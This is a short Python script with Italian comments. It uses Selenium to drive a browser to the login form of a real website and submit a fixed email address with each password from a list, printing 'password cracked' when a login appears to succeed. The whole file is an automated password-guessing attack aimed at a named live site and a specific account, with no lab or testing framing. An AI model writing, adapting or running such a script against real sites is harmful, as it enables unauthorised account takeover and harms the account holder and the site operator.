import time
from selenium import webdriver
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException

# Lista di password
passwords = ["password1",  "password2", "Test1", "password3"]

# Inizializza il driver di Selenium
driver = webdriver.Chrome()

# Apri il browser e vai all'URL
driver.get("https://www.foggiacittaaperta.it/")

for password in passwords:
    try:
        # Trova l'elemento che attiva il dropdown
        dropdown_element = driver.find_element(By.CSS_SELECTOR, "div.relative.f_right.m_right_10.m_left_10.dropdown_2_container.login")

        # Posiziona il cursore sull'elemento
        actions = ActionChains(driver)
        actions.move_to_element(dropdown_element).perform()

        # Compila il form con i dati desiderati
        email_field = driver.find_element(By.NAME, "email_address")
        password_field = driver.find_element(By.NAME, "password")



        email_field.send_keys("carlocrea4@gmail.com")
        password_field.send_keys(password)

        # Invia la richiesta POST al server
        submit_button = driver.find_element(By.ID, "button")
        submit_button.click()

        # Aggiungi un ritardo per consentire al server di elaborare la richiesta
        time.sleep(2)

        # Cerca nuovamente gli elementi email e password
        email_field = driver.find_element(By.NAME, "email_address")
        password_field = driver.find_element(By.NAME, "password")
        print("passord errata: ", password)


    except NoSuchElementException:
        print("password cracked:" , password)
        break

driver.quit()
# Pulisci i campi della password


    # Aggiungi un ritardo di cinque secondi


# Chiudi il browser


